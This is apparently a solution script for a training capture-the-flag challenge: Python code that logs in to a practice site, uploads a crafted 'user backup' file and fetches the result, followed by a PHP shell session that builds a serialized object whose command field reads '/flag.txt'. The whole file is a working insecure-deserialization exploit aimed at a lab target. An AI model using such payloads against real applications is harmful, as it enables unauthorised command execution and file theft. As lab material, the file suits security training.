import requests
import threading
import random
import string
import logging

baseurl = "http://meta.training.jinblack.it/"

# Configura il logging per scrivere su un file di log
logging.basicConfig(filename='debug.log', level=logging.DEBUG)

def randomString():
    return ''.join(random.sample(string.ascii_letters + string.digits, 10))

def login(session, username, password, log_user):
    url = "%s/login.php" % baseurl
    data = {"username": username, "password": password, "log_user": log_user}
    
    print("Login URL:", url)
    print("Login Data:", data)

    logging.debug("Login URL: %s", url)
    logging.debug("Login Data: %s", data)

    r = session.post(url, data=data)
    # print(r.text)
    logging.debug("Login Response: %s", r.text)

def registration(session, username, password1, password2, reg_user):
    url = "%s/register.php" % baseurl
    data = {"username": username, "password_1": password1, "password_2": password2, "reg_user": reg_user}
    
    print("Registration URL:", url)
    print("Registration Data:", data)

    logging.debug("Registration URL: %s", url)
    logging.debug("Registration Data: %s", data)

    r = session.post(url, data=data)
    # print(r.text)
    logging.debug("Registration Response: %s", r.text)
    return r.text

def upload(session):
    url = "%s/upload_user.php" % baseurl
    files = {'user_bak': open('ser.py', 'rb')}
    
    print("Upload URL:", url)
    print("Upload Files:", files)

    logging.debug("Upload URL: %s", url)
    logging.debug("Upload Files: %s", files)

    try:
        r = session.post(url, files=files)
        r.raise_for_status()  # Solleva un'eccezione in caso di errore HTTP
        print("Upload inviata con successo!")
        print("Upload Response:", r.status_code)
        # print(r.text)
        logging.debug("Upload Response: %s", r.text)
    except requests.exceptions.RequestException as e:
        print(f"Errore durante l'invio della richiesta: {e}")
        logging.error("Errore durante l'invio della richiesta: %s", e)

def see(session):
    url = "http://meta.training.jinblack.it/"
    
    print("See URL:", url)

    logging.debug("See URL: %s", url)

    try:
        response = session.get(url)
        response.raise_for_status()  # Solleva un'eccezione se c'è un problema con la richiesta HTTP
        print('see avvenuta con successo')
        print("See Response:", response.status_code)
        # Stampa il contenuto della risorsa
        print(response.text)
        logging.debug("See Response: %s", response.text)
    except requests.exceptions.RequestException as e:
        print(f"Errore durante la richiesta HTTP: {e}")
        logging.error("Errore durante la richiesta HTTP: %s", e)

# Esegui il tuo script con le funzioni modificate
s = requests.Session()  # per creare una sessione
u = "x"
p1 = "x"
p2 = "x"
r = 1
l = 1
u1 = "robberto"

login(s, u, p1, l)
upload(s)
see(s)



php -a
Interactive shell

php > class Challenge{
php {   //WIP Not used yet.
php {   public $name;
php {   public $description;
php {   public $setup_cmd=NULL;
php {   // public $check_cmd=NULL;
php {   public $stop_cmd=NULL;
php { 
php {   function __construct($name, $description, $stop_cmd){
php {     $this->name = $name;
php {     $this->description = $description;
php {     $this->stop_cmd = $stop_cmd;
php {   }
php { }
php > $p= new Challenge("test","ciao","cat /flag.txt");
php > $p;
php > echo serialize($p);
O:9:"Challenge":4:{s:4:"name";s:4:"test";s:11:"description";s:4:"ciao";s:9:"setup_cmd";N;s:8:"stop_cmd";s:13:"cat /flag.txt";}
php > 
